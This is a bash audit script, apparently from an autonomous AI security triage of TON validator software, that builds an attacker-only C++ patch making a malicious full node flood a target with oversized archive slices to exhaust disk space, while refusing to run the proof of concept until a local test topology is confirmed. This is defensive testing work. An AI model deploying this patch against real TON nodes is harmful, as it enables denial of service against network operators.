#!/usr/bin/env bash
# CN-ARCHIVE-01 Stage 1 local runtime plan/runner gate.
#
# This script is intentionally conservative: it prepares the concrete local
# runtime plan, safety directories, log/metric collectors, and an attacker-only
# patch payload, but it refuses to execute archive-download runtime until the
# one missing topology-specific archive-import trigger is supplied. It never
# patches target production logic, never uses public network, never runs
# destructive cleanup, and never claims PASS.

set -euo pipefail

CANDIDATE_ID="CN-ARCHIVE-01"
SOURCE_REPO="${SOURCE_REPO:-$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")/.." && pwd -P)}"
CN_ARCHIVE_WORKDIR="${CN_ARCHIVE_WORKDIR:-$HOME/ton-cn-archive-01-local}"
CN_ARCHIVE_MAX_BYTES="${CN_ARCHIVE_MAX_BYTES:-268435456}"
CN_ARCHIVE_MAX_SECONDS="${CN_ARCHIVE_MAX_SECONDS:-180}"
CN_ARCHIVE_MODE="${CN_ARCHIVE_MODE:-plan}"
CN_ARCHIVE_COMMIT="${CN_ARCHIVE_COMMIT:-}"

TARGET_DIR="${TARGET_DIR:-$CN_ARCHIVE_WORKDIR/ton-target-clean}"
ATTACKER_DIR="${ATTACKER_DIR:-$CN_ARCHIVE_WORKDIR/ton-attacker-archive}"
TARGET_BUILD_DIR="${TARGET_BUILD_DIR:-$TARGET_DIR/build-target}"
ATTACKER_BUILD_DIR="${ATTACKER_BUILD_DIR:-$ATTACKER_DIR/build-attacker}"
LOG_DIR="${LOG_DIR:-$CN_ARCHIVE_WORKDIR/logs}"
METRICS_DIR="${METRICS_DIR:-$CN_ARCHIVE_WORKDIR/metrics}"
PATCH_DIR="${PATCH_DIR:-$CN_ARCHIVE_WORKDIR/patches}"
PLAN_DIR="${PLAN_DIR:-$CN_ARCHIVE_WORKDIR/plan}"

TARGET_DB_ROOT="${TARGET_DB_ROOT:-}"
TARGET_LOG="${TARGET_LOG:-}"
ATTACKER_LOG="${ATTACKER_LOG:-}"

fail() {
  printf 'ERROR: %s\n' "$*" >&2
  exit 1
}

blocker() {
  cat <<BLOCKER
FORMAT BLOCKER_RUNTIME_PLAN
Candidate: $CANDIDATE_ID
Exact blocker: $*
Runtime executed: no
BLOCKER
  exit 2
}

note() { printf '%s\n' "$*"; }

need_tool() {
  local tool="$1"
  if command -v "$tool" >/dev/null 2>&1; then
    printf 'tool %-8s OK: %s\n' "$tool" "$(command -v "$tool")"
  else
    printf 'tool %-8s MISSING\n' "$tool"
    return 1
  fi
}

is_uint() {
  case "$1" in
    ''|*[!0-9]*) return 1 ;;
    *) return 0 ;;
  esac
}

repo_commit() {
  if [ -n "$CN_ARCHIVE_COMMIT" ]; then
    printf '%s\n' "$CN_ARCHIVE_COMMIT"
  else
    git -C "$SOURCE_REPO" rev-parse --verify HEAD
  fi
}

write_attacker_patch() {
  local patch_file="$PATCH_DIR/cn_archive_01_attacker_only.patch"
  mkdir -p -- "$PATCH_DIR"
  cat > "$patch_file" <<'PATCH'
diff --git a/validator/full-node-shard.cpp b/validator/full-node-shard.cpp
--- a/validator/full-node-shard.cpp
+++ b/validator/full-node-shard.cpp
@@
 #include "ton/ton-io.hpp"
+
+#include <algorithm>
+#include <atomic>
+#include <cstdlib>
+#include <cstring>
@@
 void FullNodeShardImpl::process_query(adnl::AdnlNodeIdShort src, ton_api::tonNode_getArchiveInfo &query,
                                       td::Promise<td::BufferSlice> promise) {
+  if (std::getenv("TON_CN_ARCHIVE_ATTACKER") != nullptr) {
+    auto archive_id = static_cast<td::uint64>(std::getenv("TON_CN_ARCHIVE_ID") != nullptr
+                                                  ? std::strtoull(std::getenv("TON_CN_ARCHIVE_ID"), nullptr, 10)
+                                                  : query.masterchain_seqno_);
+    LOG(ERROR) << "TON_CN_ARCHIVE_ATTACKER archive_info src=" << src << " archive_id=" << archive_id
+               << " masterchain_seqno=" << query.masterchain_seqno_;
+    promise.set_value(create_serialize_tl_object<ton_api::tonNode_archiveInfo>(archive_id));
+    return;
+  }
   auto P = td::PromiseCreator::lambda(
       [SelfId = actor_id(this), promise = std::move(promise)](td::Result<td::uint64> R) mutable {
@@
 void FullNodeShardImpl::process_query(adnl::AdnlNodeIdShort src, ton_api::tonNode_getShardArchiveInfo &query,
                                       td::Promise<td::BufferSlice> promise) {
+  if (std::getenv("TON_CN_ARCHIVE_ATTACKER") != nullptr) {
+    auto archive_id = static_cast<td::uint64>(std::getenv("TON_CN_ARCHIVE_ID") != nullptr
+                                                  ? std::strtoull(std::getenv("TON_CN_ARCHIVE_ID"), nullptr, 10)
+                                                  : query.masterchain_seqno_);
+    LOG(ERROR) << "TON_CN_ARCHIVE_ATTACKER shard_archive_info src=" << src << " archive_id=" << archive_id
+               << " masterchain_seqno=" << query.masterchain_seqno_;
+    promise.set_value(create_serialize_tl_object<ton_api::tonNode_archiveInfo>(archive_id));
+    return;
+  }
   auto P = td::PromiseCreator::lambda(
       [SelfId = actor_id(this), promise = std::move(promise)](td::Result<td::uint64> R) mutable {
@@
 void FullNodeShardImpl::process_query(adnl::AdnlNodeIdShort src, ton_api::tonNode_getArchiveSlice &query,
                                       td::Promise<td::BufferSlice> promise) {
+  if (std::getenv("TON_CN_ARCHIVE_ATTACKER") != nullptr) {
+    static std::atomic<td::uint64> slice_no{0};
+    static std::atomic<td::uint64> cumulative_bytes{0};
+    auto n = ++slice_no;
+    auto requested = query.max_size_ > 0 ? static_cast<td::uint64>(query.max_size_) : 0;
+    auto cap = static_cast<td::uint64>(1) << 24;
+    auto returned = std::min(requested, cap);
+    if (const char *limit = std::getenv("TON_CN_ARCHIVE_RETURN_BYTES")) {
+      returned = std::min(returned, static_cast<td::uint64>(std::strtoull(limit, nullptr, 10)));
+    }
+    td::BufferSlice data(returned);
+    std::memset(data.as_slice().data(), 'A', data.size());
+    auto total = cumulative_bytes.fetch_add(returned) + returned;
+    LOG(ERROR) << "TON_CN_ARCHIVE_ATTACKER archive_id=" << query.archive_id_ << " offset=" << query.offset_
+               << " requested_size=" << query.max_size_ << " returned_size=" << returned << " slice_no=" << n
+               << " cumulative_bytes=" << total << " src=" << src;
+    promise.set_value(std::move(data));
+    return;
+  }
   VLOG(FULL_NODE_DEBUG) << "Got query getArchiveSlice " << query.archive_id_ << " " << query.offset_ << " "
                         << query.max_size_ << " from " << src;
PATCH
  note "$patch_file"
}

write_plan_files() {
  mkdir -p -- "$LOG_DIR" "$METRICS_DIR" "$PLAN_DIR"
  local commit branch plan_file commands_file patch_file
  commit="$(repo_commit)"
  branch="$(git -C "$SOURCE_REPO" branch --show-current 2>/dev/null || true)"
  patch_file="$(write_attacker_patch)"
  plan_file="$PLAN_DIR/cn_archive_01_runtime_plan.txt"
  commands_file="$PLAN_DIR/cn_archive_01_commands.sh"

  cat > "$commands_file" <<COMMANDS
#!/usr/bin/env bash
set -euo pipefail
# Concrete existing repo commands for the CN-ARCHIVE-01 local-only run.
# Review before running. These commands operate only under CN_ARCHIVE_WORKDIR.

SOURCE_REPO=${SOURCE_REPO@Q}
CN_ARCHIVE_WORKDIR=${CN_ARCHIVE_WORKDIR@Q}
TARGET_DIR=${TARGET_DIR@Q}
ATTACKER_DIR=${ATTACKER_DIR@Q}
TARGET_BUILD_DIR=${TARGET_BUILD_DIR@Q}
ATTACKER_BUILD_DIR=${ATTACKER_BUILD_DIR@Q}
COMMIT=${commit@Q}
PATCH_FILE=${patch_file@Q}

mkdir -p "\$CN_ARCHIVE_WORKDIR"
git clone "\$SOURCE_REPO" "\$TARGET_DIR"
git -C "\$TARGET_DIR" checkout -q "\$COMMIT"
git -C "\$TARGET_DIR" submodule sync --recursive
git -C "\$TARGET_DIR" submodule update --init --recursive
cmake -S "\$TARGET_DIR" -B "\$TARGET_BUILD_DIR" -DCMAKE_BUILD_TYPE=RelWithDebInfo -DCMAKE_C_COMPILER=clang -DCMAKE_CXX_COMPILER=clang++
cmake --build "\$TARGET_BUILD_DIR" --target validator-engine dht-server validator-engine-console create-state generate-random-id tonlibjson -j"\${JOBS:-\$(nproc)}"

git clone "\$SOURCE_REPO" "\$ATTACKER_DIR"
git -C "\$ATTACKER_DIR" checkout -q "\$COMMIT"
git -C "\$ATTACKER_DIR" submodule sync --recursive
git -C "\$ATTACKER_DIR" submodule update --init --recursive
git -C "\$ATTACKER_DIR" apply --check "\$PATCH_FILE"
git -C "\$ATTACKER_DIR" apply "\$PATCH_FILE"
cmake -S "\$ATTACKER_DIR" -B "\$ATTACKER_BUILD_DIR" -DCMAKE_BUILD_TYPE=RelWithDebInfo -DCMAKE_C_COMPILER=clang -DCMAKE_CXX_COMPILER=clang++
cmake --build "\$ATTACKER_BUILD_DIR" --target validator-engine -j"\${JOBS:-\$(nproc)}"

# Existing local topology API to use from the final archive runner:
#   test/tontester/src/tontester/install.py::Install
#   test/tontester/src/tontester/network.py::Network
#   test/tontester/src/tontester/network.py::StartOptions
# Existing binary properties:
#   Install.validator_engine_exe
#   Install.generate_random_id_exe
#   Install.validator_engine_console_exe
# Existing node helpers:
#   Network.create_dht_node()
#   Network.create_full_node()
#   FullNode.make_initial_validator()
#   FullNode.announce_to(dht)
#   FullNode.run(StartOptions(...))
COMMANDS
  chmod +x "$commands_file"

  cat > "$plan_file" <<PLAN
Candidate: $CANDIDATE_ID
Status: BLOCKER_RUNTIME_PLAN / no-runtime-executed
Repository root: $SOURCE_REPO
Branch: ${branch:-DETACHED}
Commit: $commit
Workdir: $CN_ARCHIVE_WORKDIR
Attacker-only patch: $patch_file
Concrete commands: $commands_file

Hypothesis:
A clean out-of-sync target enters normal archive network import, chooses a malicious full-node neighbour, receives repeated full-size tonNode_getArchiveSlice responses, writes them to db_root/tmp, and grows temp-file/disk usage until safety stop, without an archive byte cap.

Product path preserved:
- validator/manager.cpp::ValidatorManagerImpl::prestart_sync()
- validator/manager.cpp::ValidatorManagerImpl::download_next_archive()
- validator/import-db-slice.cpp::ArchiveImporter::start_up()
- validator/import-db-slice.cpp::ArchiveImporter::download_shard_archive()
- validator/full-node.cpp::FullNodeImpl::download_archive()
- validator/full-node-shard.cpp::FullNodeShardImpl::download_archive()
- validator/net/download-archive-slice.cpp::DownloadArchiveSlice

Existing local tooling identified:
- audit/run_stage_b_local.sh shows the local checkout/build pattern for clean target and attacker-only checkout.
- audit/stage_b_tontester_topology.py shows the local tontester Network/Install/StartOptions pattern for DHT, donor, target, and attacker full nodes.
- test/tontester/src/tontester/install.py defines build-dir binary paths such as validator-engine and generate-random-id.
- test/tontester/src/tontester/network.py defines Network.create_dht_node(), Network.create_full_node(), FullNode.announce_to(), FullNode.make_initial_validator(), and FullNode.run(StartOptions(...)).
- validator/net/download-archive-slice.cpp logs "downloading archive slice #... from <ADNL>" after archive info selection.
- validator/import-db-slice.cpp logs "Importing archive for masterchain seqno #... from net" before requesting db_root/tmp archive download.

Runtime collection required after the missing topology trigger is resolved:
- target log grep: Importing archive | download archive | downloading archive slice | archive source / neighbour ADNL
- attacker log grep: TON_CN_ARCHIVE_ATTACKER archive_id= offset= requested_size= returned_size= slice_no= cumulative_bytes=
- metrics loop: du -b "\$TARGET_DB_ROOT/tmp" and df -B1 "\$TARGET_DB_ROOT/tmp" at one-second cadence
- safety stops: cumulative bytes >= $CN_ARCHIVE_MAX_BYTES OR elapsed seconds >= $CN_ARCHIVE_MAX_SECONDS

Exact blocker:
The repo has reusable tontester full-node topology tooling and target archive downloader code, but no existing archive-specific local topology command/file was found that forces a clean out-of-sync target into ValidatorManagerImpl::prestart_sync() -> download_next_archive() -> ArchiveImporter::start_up() from-net archive import while making the attacker the selected full-node neighbour. Stage B tooling drives persistent-state download, not archive-slice import. Running a guessed topology would risk faking CN-ARCHIVE-01 evidence.

Parked next step:
Continue autonomous triage elsewhere. Unpark CN-ARCHIVE-01 only if repo-local static discovery finds a concrete archive-import trigger that sets the target out-of-sync for archive import and deterministically constrains neighbour selection to the controlled attacker.
PLAN

  note "Plan written: $plan_file"
  note "Commands written: $commands_file"
  note "Attacker-only patch written: $patch_file"
}

collect_logs_once() {
  mkdir -p -- "$LOG_DIR" "$METRICS_DIR"
  local stamp target_filter attacker_filter metrics_file
  stamp="$(date -u +%Y%m%dT%H%M%SZ)"
  target_filter="$LOG_DIR/target_archive_filter_$stamp.log"
  attacker_filter="$LOG_DIR/attacker_archive_filter_$stamp.log"
  metrics_file="$METRICS_DIR/db_root_tmp_$stamp.csv"

  if [ -n "$TARGET_LOG" ] && [ -f "$TARGET_LOG" ]; then
    rg -n "Importing archive|download archive|downloading archive slice|archive.*(source|neigh|ADNL)|from [0-9a-fA-F]{16,}" "$TARGET_LOG" > "$target_filter" || true
    note "target filtered log: $target_filter"
  fi
  if [ -n "$ATTACKER_LOG" ] && [ -f "$ATTACKER_LOG" ]; then
    rg -n "TON_CN_ARCHIVE_ATTACKER|archive_id=|offset=|requested_size=|returned_size=|slice_no=|cumulative_bytes=" "$ATTACKER_LOG" > "$attacker_filter" || true
    note "attacker filtered log: $attacker_filter"
  fi
  if [ -n "$TARGET_DB_ROOT" ] && [ -d "$TARGET_DB_ROOT/tmp" ]; then
    {
      printf 'unix_ts,du_bytes,df_avail_bytes,df_used_bytes,df_size_bytes,path\n'
      du_bytes="$(du -sb "$TARGET_DB_ROOT/tmp" | awk '{print $1}')"
      df_line="$(df -B1 --output=avail,used,size "$TARGET_DB_ROOT/tmp" | tail -n 1)"
      printf '%s,%s,%s,%s,%s,%s\n' "$(date +%s)" "$du_bytes" $df_line "$TARGET_DB_ROOT/tmp"
    } > "$metrics_file"
    note "metrics snapshot: $metrics_file"
  fi
}

preflight() {
  cd "$SOURCE_REPO"
  git rev-parse --is-inside-work-tree >/dev/null 2>&1 || fail "not inside git work tree: $SOURCE_REPO"

  local branch commit missing_tools submodule_tmp
  branch="$(git branch --show-current 2>/dev/null || true)"
  commit="$(repo_commit)"

  note "Candidate: $CANDIDATE_ID"
  note "Repository root: $SOURCE_REPO"
  note "Branch: ${branch:-DETACHED}"
  note "Commit: $commit"
  note "Workdir: $CN_ARCHIVE_WORKDIR"
  note "CN_ARCHIVE_MAX_BYTES: $CN_ARCHIVE_MAX_BYTES"
  note "CN_ARCHIVE_MAX_SECONDS: $CN_ARCHIVE_MAX_SECONDS"
  note "Mode: $CN_ARCHIVE_MODE"

  is_uint "$CN_ARCHIVE_MAX_BYTES" || fail "CN_ARCHIVE_MAX_BYTES must be an unsigned integer"
  is_uint "$CN_ARCHIVE_MAX_SECONDS" || fail "CN_ARCHIVE_MAX_SECONDS must be an unsigned integer"
  [ "$CN_ARCHIVE_MAX_BYTES" -gt 0 ] || fail "CN_ARCHIVE_MAX_BYTES must be greater than zero"
  [ "$CN_ARCHIVE_MAX_SECONDS" -gt 0 ] || fail "CN_ARCHIVE_MAX_SECONDS must be greater than zero"

  note ""
  note "Checking required local tools (no install attempted):"
  missing_tools=0
  for tool in git cmake ninja clang python3 rg du df awk sed; do
    need_tool "$tool" || missing_tools=1
  done
  [ "$missing_tools" -eq 0 ] || fail "one or more required tools are missing"

  note ""
  note "Checking submodules:"
  [ -f .gitmodules ] || fail ".gitmodules is missing; cannot verify submodules"
  submodule_tmp="$CN_ARCHIVE_WORKDIR/submodule_status.$$"
  mkdir -p -- "$CN_ARCHIVE_WORKDIR"
  git submodule status --recursive > "$submodule_tmp" || fail "git submodule status failed"
  cat "$submodule_tmp"
  if grep -qE '^[-+]' "$submodule_tmp"; then
    rm -f "$submodule_tmp"
    fail "submodules are missing, uninitialized, or not at recorded commits"
  fi
  rm -f "$submodule_tmp"
  [ -d third-party/openssl ] || fail "required submodule third-party/openssl is missing"
  [ -n "$(find third-party/openssl -mindepth 1 -maxdepth 1 -print -quit 2>/dev/null)" ] || fail "required submodule third-party/openssl is empty"
}

print_summary() {
  cat <<SUMMARY

FORMAT BLOCKER_RUNTIME_PLAN
Candidate ID: $CANDIDATE_ID
Runtime executed: no
Files/functions inspected:
- audit/run_stage_b_local.sh
- audit/stage_b_tontester_topology.py
- test/tontester/src/tontester/install.py
- test/tontester/src/tontester/network.py
- validator/manager.cpp::ValidatorManagerImpl::prestart_sync()
- validator/manager.cpp::ValidatorManagerImpl::download_next_archive()
- validator/import-db-slice.cpp::ArchiveImporter::start_up()
- validator/full-node.cpp::FullNodeImpl::download_archive()
- validator/full-node-shard.cpp::FullNodeShardImpl::download_archive()
- validator/full-node-shard.cpp::process_query(tonNode_getArchiveInfo / tonNode_getShardArchiveInfo / tonNode_getArchiveSlice)
- validator/net/download-archive-slice.cpp::DownloadArchiveSlice
What is missing:
- A confirmed existing archive-import topology runner/command that makes a clean target enter normal archive network import and select the controlled attacker full-node neighbour.
Why CN-ARCHIVE-01 is not closed:
- Product code still shows archive downloads are written to a mkstemp file under db_root/tmp and repeated while returned slice size equals slice_size(); the missing piece is only safe local runtime wiring, not disproof.
One minimal next action:
- Park CN-ARCHIVE-01 and continue autonomous Critical/High triage. Unpark only if repo-local source review identifies an existing product-path archive-import trigger and deterministic attacker-neighbour selection path; do not ask the user for topology internals.
SUMMARY
}

main() {
  preflight
  write_plan_files
  collect_logs_once

  case "$CN_ARCHIVE_MODE" in
    plan)
      print_summary
      exit 2
      ;;
    run)
      blocker "CN-ARCHIVE-01 is parked/runtime-trigger-blocked: repo-local source review did not find a confirmed archive-import product-path trigger or deterministic attacker-neighbour selection path; refusing guessed PoC execution."
      ;;
    *)
      fail "unknown CN_ARCHIVE_MODE=$CN_ARCHIVE_MODE (expected plan or run)"
      ;;
  esac
}

main "$@"
